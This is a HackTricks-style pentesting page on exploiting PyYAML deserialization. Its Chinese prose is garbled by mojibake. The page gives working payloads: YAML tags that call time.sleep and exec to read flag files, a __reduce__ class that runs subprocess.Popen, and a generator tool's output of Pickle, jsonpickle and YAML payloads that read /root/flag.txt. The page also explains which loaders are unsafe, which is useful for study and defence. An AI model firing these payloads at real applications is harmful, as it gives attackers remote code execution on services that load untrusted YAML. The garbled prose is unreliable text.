# Python Yaml Deserialization

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Yaml **ååºåˆ—åŒ–**

**Yaml** python åº“ä¹Ÿèƒ½å¤Ÿ **åºåˆ—åŒ– python å¯¹è±¡** è€Œä¸ä»…ä»…æ˜¯åŸå§‹æ•°æ®ï¼š
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
æ£€æŸ¥ä¸€ä¸‹ **tuple** ä¸æ˜¯åŸå§‹æ•°æ®ç±»å‹ï¼Œå› æ­¤å®ƒè¢« **åºåˆ—åŒ–** äº†ã€‚ **range** ä¹Ÿæ˜¯å¦‚æ­¤ï¼ˆå–è‡ªå†…ç½®å‡½æ•°ï¼‰ã€‚

![](<../../.gitbook/assets/image (1040).png>)

**safe\_load()** æˆ– **safe\_load\_all()** ä½¿ç”¨ SafeLoaderï¼Œå¹¶ä¸” **ä¸æ”¯æŒç±»å¯¹è±¡ååºåˆ—åŒ–**ã€‚ ç±»å¯¹è±¡ååºåˆ—åŒ–ç¤ºä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
ä¹‹å‰çš„ä»£ç ä½¿ç”¨äº† **unsafe\_load** æ¥åŠ è½½åºåˆ—åŒ–çš„ python ç±»ã€‚è¿™æ˜¯å› ä¸ºåœ¨ **version >= 5.1** ä¸­ï¼Œå®ƒä¸å…è®¸ **ååºåˆ—åŒ–ä»»ä½•åºåˆ—åŒ–çš„ python ç±»æˆ–ç±»å±æ€§**ï¼Œå¦‚æœåœ¨ load() ä¸­æœªæŒ‡å®š Loader æˆ– Loader=SafeLoaderã€‚

### åŸºæœ¬åˆ©ç”¨

å¦‚ä½• **æ‰§è¡Œä¸€ä¸ª sleep** çš„ç¤ºä¾‹ï¼š
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
### æ¼æ´ .load("\<content>") æ²¡æœ‰ Loader

**æ—§ç‰ˆæœ¬**çš„ pyyaml åœ¨åŠ è½½å†…å®¹æ—¶å¦‚æœ**ä¸æŒ‡å®š Loader**ï¼Œåˆ™å®¹æ˜“å—åˆ°ååºåˆ—åŒ–æ”»å‡»ï¼š`yaml.load(data)`

æ‚¨å¯ä»¥åœ¨[**æ­¤å¤„æ‰¾åˆ°æ¼æ´çš„æè¿°**](https://hackmd.io/@defund/HJZajCVlP)**.** é¡µé¢ä¸­æå‡ºçš„**åˆ©ç”¨**æ˜¯ï¼š
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
æˆ–è€…ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ª**@ishaack æä¾›çš„å•è¡Œä»£ç **ï¼š
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
æ³¨æ„ï¼Œåœ¨**æœ€è¿‘çš„ç‰ˆæœ¬**ä¸­ï¼Œæ‚¨ä¸èƒ½**å†è°ƒç”¨ `.load()`** **è€Œä¸ä½¿ç”¨ `Loader`**ï¼Œå¹¶ä¸”**`FullLoader`** **ä¸å†æ˜“å—æ­¤æ”»å‡»**ã€‚

## RCE

å¯ä»¥ä½¿ç”¨ Python YAML æ¨¡å—ï¼Œå¦‚ **PyYAML** æˆ– **ruamel.yaml** åˆ›å»ºè‡ªå®šä¹‰æœ‰æ•ˆè´Ÿè½½ã€‚è¿™äº›æœ‰æ•ˆè´Ÿè½½å¯ä»¥åˆ©ç”¨åœ¨æ²¡æœ‰é€‚å½“æ¸…ç†çš„æƒ…å†µä¸‹ååºåˆ—åŒ–ä¸å—ä¿¡ä»»è¾“å…¥çš„ç³»ç»Ÿä¸­çš„æ¼æ´ã€‚
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
### åˆ›å»ºæœ‰æ•ˆè´Ÿè½½çš„å·¥å…·

è¯¥å·¥å…· [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) å¯ç”¨äºç”Ÿæˆ python ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥æ»¥ç”¨ **Pickle, PyYAML, jsonpickle å’Œ ruamel.yaml:**
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
### å‚è€ƒæ–‡çŒ®

* [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
